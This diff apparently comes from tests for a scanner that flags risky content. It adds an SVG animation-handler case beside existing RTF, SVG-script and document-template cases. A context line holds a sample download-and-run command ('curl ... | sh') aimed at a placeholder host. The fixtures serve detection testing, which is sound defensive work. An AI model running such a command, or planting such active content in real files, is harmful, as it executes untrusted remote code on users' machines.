@@ -262,6 +262,12 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ("doc_external_template", rels, rels_miss),
         ("doc_rtf_object", b"{\\rtf1 \\objupdate }\n", b"{\\rtf1 hello}\n"),
         ("doc_svg_active", b"<svg><script></script></svg>", b"<svg><rect/></svg>"),
+        # A handler body on an animation element; declarative animation with begin= stays clean.
+        (
+            "doc_svg_event_handler",
+            b'<svg><animate attributeName="x" onbegin="void 0"/></svg>',
+            b'<svg><animate attributeName="x" begin="0s" dur="1s"/></svg>',
+        ),
         (
             "script_download_execute",
             b"curl https://example.invalid/install | sh\n",
